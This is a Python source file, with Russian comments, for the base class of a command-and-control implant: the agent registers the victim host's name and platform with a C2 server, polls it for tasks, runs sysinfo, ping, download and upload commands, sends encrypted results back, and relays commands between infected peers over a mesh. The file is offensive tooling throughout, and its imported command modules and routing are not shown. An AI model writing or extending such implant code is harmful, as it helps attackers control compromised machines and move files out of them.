import time
import asyncio
import uuid
import platform
import requests
from agents.commands import sysinfo, ping, download, upload
from agents.crypto import encrypt, decrypt
from shared.config import SERVER_URL

class BaseAgent:
    def __init__(self):
        self.agent_id = str(uuid.uuid4())
        self.hostname = platform.node()
        self.platform = platform.system()
        self.running = True

        # Для отслеживания ожидающих ответов по mesh: peer_id -> Future
        self.pending_responses = {}

    def register(self):
        """ Регистрируется на C2-сервере. """
        try:
            res = requests.post(f"{SERVER_URL}/agents/register", json={
                "agent_id": self.agent_id,
                "hostname": self.hostname,
                "platform": self.platform
            })
            if res.status_code == 200:
                print(f"[Agent:{self.agent_id}] Registered successfully.")
            else:
                print(f"[Agent:{self.agent_id}] Registration failed: {res.text}")
        except Exception as e:
            print(f"[Agent:{self.agent_id}] Registration error: {e}")

    def fetch_tasks(self):
        """ Запрашивает задачи с сервера. """
        try:
            res = requests.get(f"{SERVER_URL}/tasks/{self.agent_id}")
            if res.status_code == 200:
                return res.json()
        except Exception as e:
            print(f"[Agent:{self.agent_id}] Task fetch error: {e}")
        return []

    def send_result(self, task_id, result):
        """ Отправляет результат выполнения задачи. """
        try:
            res = requests.post(f"{SERVER_URL}/results/", json={
                "agent_id": self.agent_id,
                "task_id": task_id,
                "result": encrypt(result)
            })
            if res.status_code == 200:
                print(f"[Agent:{self.agent_id}] Result sent for task {task_id}")
        except Exception as e:
            print(f"[Agent:{self.agent_id}] Result send error: {e}")

    def run_task(self, task):
        command = task.get("command")
        task_id = task.get("id")
        params = task.get("params", {})

        if command == "sysinfo":
            result = sysinfo.run()
        elif command == "ping":
            result = ping.run()
        elif command == "download":
            result = download.run(params)
        elif command == "upload":
            result = upload.run(params)
        else:
            result = f"Unknown command: {command}"

        self.send_result(task_id, result)

    async def run(self):
        """ Основной цикл агента. """
        self.register()

        while self.running:
            tasks = self.fetch_tasks()
            for task in tasks:
                self.run_task(task)
            await asyncio.sleep(5)

    async def process_payload(self, payload):
        """
        Обработка входящей полезной нагрузки (например, команды, пришедшей через mesh).
        Поддерживает те же команды, что и run_task, но payload может быть другим форматом.
        """
        cmd_type = payload.get("type")
        source = payload.get("from")

        if cmd_type == "sysinfo":
            # Выполнить команду sysinfo и отправить результат обратно
            result = sysinfo.run()
            print(f"[Agent:{self.agent_id}] sysinfo command executed via mesh")
            if source:
                response_payload = {
                    "type": "sysinfo_result",
                    "data": result,
                    "to": source,
                    "from": self.agent_id,
                }
                await self.send_via_route(source, response_payload)

        elif cmd_type == "sysinfo_result":
            # Получен ответ на запрос sysinfo
            future = self.pending_responses.pop(source, None)
            if future:
                future.set_result(payload.get("data"))
            else:
                print(f"[Agent:{self.agent_id}] Received unexpected sysinfo_result from {source}")

        elif cmd_type == "ping":
            print(f"[Agent:{self.agent_id}] Received ping from {source}")

        else:
            print(f"[Agent:{self.agent_id}] Unknown payload type: {cmd_type}")

    async def request_sysinfo(self, target_agent_id):
        """
        Запросить sysinfo у другого агента через mesh и дождаться ответа.
        """
        if target_agent_id == self.agent_id:
            # Локальный запрос — сразу вернуть
            return sysinfo.run()

        future = asyncio.get_event_loop().create_future()
        self.pending_responses[target_agent_id] = future

        payload = {
            "type": "sysinfo",
            "from": self.agent_id,
            "to": target_agent_id,
        }
        await self.send_via_route(target_agent_id, payload)

        try:
            result = await asyncio.wait_for(future, timeout=10)
            return result
        except asyncio.TimeoutError:
            self.pending_responses.pop(target_agent_id, None)
            print(f"[Agent:{self.agent_id}] Timeout waiting for sysinfo from {target_agent_id}")
            return None

    async def send_via_route(self, destination_id, payload):
        """
        Заглушка — должен быть переопределен в потомках, которые умеют отправлять по маршруту.
        """
        raise NotImplementedError("send_via_route must be implemented in subclasses")
